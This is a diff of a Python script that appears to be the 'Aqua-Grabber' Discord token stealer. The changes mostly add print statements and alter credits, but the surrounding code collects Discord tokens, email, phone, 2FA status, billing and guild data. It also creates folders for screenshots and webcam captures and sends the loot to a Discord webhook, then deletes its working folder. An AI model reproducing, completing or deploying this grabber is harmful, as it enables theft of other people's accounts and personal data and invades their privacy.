@@ -34,12 +34,21 @@ def get_HWID():
 def makeDir():
     if not os.path.exists('C:/Users/Public/Aqua'):
         os.mkdir("C:/Users/Public/Aqua")
+        print("Created Aqua")
+    else:
+        shutil.rmtree("C:/Users/Public/Aqua")
+        print("Deleted Aqua")
+        os.mkdir("C:/Users/Public/Aqua")
+        print("Created Aqua")
     if not os.path.exists('C:/Users/Public/Aqua/ss'):
         os.mkdir("C:/Users/Public/Aqua/ss")
+        print("Created ss")
     if not os.path.exists('C:/Users/Public/Aqua/Cam'):
         os.mkdir("C:/Users/Public/Aqua/Cam")
+        print("Created cam")
     if not os.path.exists('C:/Users/Public/Aqua/Info'):
         os.mkdir("C:/Users/Public/Aqua/Info")
+        print("Created Info")
 
 
 def takeSS():
@@ -197,13 +206,12 @@ def getDcToken():
         embed.set_image(avatar)
         embed.set_description(
             f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token : ```{token}```\n<a:boost:988374649253552158> Nitro : ```{nitro}```\n✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
-        embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & laylaa | Grabbed By Aqua 💦")
+        embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
 
         webhook.execute()
         webhook.remove_files()
         webhook.remove_embeds()
-        print(getGuilds())
-        print("ONG THIS ONE WORKED")
+        print(f"Extracted Details From {token}")
 
     def get_tokens(path):
         cleaned = []
@@ -276,6 +284,7 @@ def getDcToken():
 # Clean Up
 def cleanUp():
     shutil.rmtree(Aqua)
+    print("Cleaned Up")
 
 
 webhook_url = 'Webhook_here'
